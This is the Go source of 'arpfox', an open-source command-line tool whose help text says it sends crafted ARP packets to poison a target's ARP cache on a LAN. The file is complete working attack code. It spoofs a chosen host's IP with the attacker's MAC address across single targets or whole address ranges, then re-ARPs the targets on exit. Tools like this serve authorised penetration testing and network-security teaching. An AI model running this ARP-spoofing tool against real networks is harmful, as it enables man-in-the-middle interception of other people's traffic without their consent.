// Copyright (c) 2016 José Nieto, https://menteslibres.net/malfunkt
//
// Permission is hereby granted, free of charge, to any person obtaining
// a copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, sublicense, and/or sell copies of the Software, and to
// permit persons to whom the Software is furnished to do so, subject to
// the following conditions:
//
// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
// LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
// OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"
)

func defaultInterface() string {
	switch runtime.GOOS {
	case "windows":
		return "Ethernet"
	}
	return "eth0"
}

var (
	flagInterface      = flag.String("i", defaultInterface(), `Network interface.`)
	flagTarget         = flag.String("t", "", `Target host(s). Provide a single IP: "1.2.3.4", a CIDR block "1.2.3.0/24", an IP range: "1.2.3-7.4-12", an IP with a wildcard: "1.2.3.*", or a list with any combination: "1.2.3.4, 1.2.3.0/24, ..."`)
	flagListInterfaces = flag.Bool("l", false, `List available interfaces and exit.`)
	flagWaitInterval   = flag.Float64("w", 5.0, `Wait <w> seconds between every broadcast, <w> must be a value greater than 0.1.`)
	flagHelp           = flag.Bool("h", false, `Print usage instructions and exit.`)
)

func main() {
	flag.Parse()

	if *flagHelp {
		fmt.Println("arpfox sends specially crafted ARP packets to a given host on a LAN in order")
		fmt.Println("to poison its ARP cache table.")
		fmt.Println("")
		fmt.Println("Kernel IP forwarding must be turned on ahead of time.")
		fmt.Println("")
		fmt.Println("Usage: ")
		fmt.Println("arpfox [-i interface] -t target host")
		fmt.Println("")
		flag.PrintDefaults()
		os.Exit(0)
	}

	if *flagListInterfaces {
		ifaces, err := net.Interfaces()
		if err != nil {
			log.Fatal("Failed to retrieve interfaces: ", err)
		}
		for _, iface := range ifaces {
			if iface.HardwareAddr == nil {
				continue
			}
			fmt.Printf("%s \"%s\"\n", iface.HardwareAddr, iface.Name)
		}
		os.Exit(0)
	}

	if *flagWaitInterval < 0.1 {
		*flagWaitInterval = 0.1
	}

	if *flagTarget == "" {
		log.Fatal("Missing target (-t 192.168.1.7).")
	}

	iface, err := net.InterfaceByName(*flagInterface)
	if err != nil {
		log.Fatalf("Could not use interface %s: %v", *flagInterface, err)
	}

	if runtime.GOOS == "windows" {
		iface.Name, err = getRealCardName(iface)
		if err != nil {
			log.Fatal("could not translate card name: ", err)
		}
	}

	handler, err := pcap.OpenLive(iface.Name, 65535, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()

	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()
	if err != nil {
		log.Fatal(err)
	}

	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}
	if ifaceAddr == nil {
		log.Fatal("Could not get interface address.")
	}

	var targetAddrs []net.IP
	if *flagTarget != "" {
		addrRange, err := iprange.ParseList(*flagTarget)
		if err != nil {
			log.Fatal("Wrong format for target.")
		}
		targetAddrs = addrRange.Expand()
		if len(targetAddrs) == 0 {
			log.Fatalf("No valid targets given.")
		}
	}

	hostIP := ifaceAddr.IP
	if argHostIP := flag.Arg(0); argHostIP != "" {
		hostIP = net.ParseIP(argHostIP)
		if hostIP == nil {
			log.Fatalf("Wrong format for host IP.")
		}
		hostIP = hostIP.To4()
	}

	stop := make(chan struct{}, 2)

	// Waiting for ^C
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for {
			select {
			case <-c:
				log.Println("'stop' signal received; stopping...")
				close(stop)
				return
			}
		}
	}()

	go readARP(handler, stop, iface)

	// Get original source
	origSrc, err := arp.Lookup(binary.BigEndian.Uint32(hostIP))
	if err != nil {
		log.Fatalf("Unable to lookup hw address for %s: %v", hostIP, err)
	}

	fakeSrc := arp.Address{
		IP:           hostIP,
		HardwareAddr: iface.HardwareAddr,
	}

	<-writeARP(handler, stop, targetAddrs, &fakeSrc, time.Duration(*flagWaitInterval*1000.0)*time.Millisecond)

	<-cleanUpAndReARP(handler, targetAddrs, origSrc)

	os.Exit(0)
}

func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
	log.Printf("Cleaning up and re-ARPing targets...")

	stopReARPing := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopReARPing)
	}()

	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
}

func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})
	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			default:
				<-t.C
				for _, ip := range targetAddrs {
					arpAddr, err := arp.Lookup(binary.BigEndian.Uint32(ip))
					if err != nil {
						log.Printf("Could not retrieve %v's MAC address: %v", ip, err)
						continue
					}
					dst := &arp.Address{
						IP:           ip,
						HardwareAddr: arpAddr.HardwareAddr,
					}
					buf, err := arp.NewARPRequest(src, dst)
					if err != nil {
						log.Print("NewARPRequest: ", err)
						continue
					}
					if err := handler.WritePacketData(buf); err != nil {
						log.Print("WritePacketData: ", err)
					}
				}
			}
		}
	}(stoppedWriting)
	return stoppedWriting
}

func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			if packet.Operation == layers.ARPReply {
				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			log.Printf("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation, net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress), net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}

// getRealCardName returns the underlying network card name.
// Actual Windows network card names look like:
// "\Device\NPF_{8D51979B-6048-4472-BBA9-379CF7C7A339}"
func getRealCardName(iface *net.Interface) (string, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return "", err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return "", err
	}

	for _, data := range devices {
		for i := range addrs {
			for j := range data.Addresses {
				if data.Addresses[j].IP.To4() == nil {
					continue
				}
				if addrs[i].(*net.IPNet).Contains(data.Addresses[j].IP) {
					return data.Name, nil
				}
			}
		}
	}

	return "", fmt.Errorf("could not find a network card that matches the interface")
}
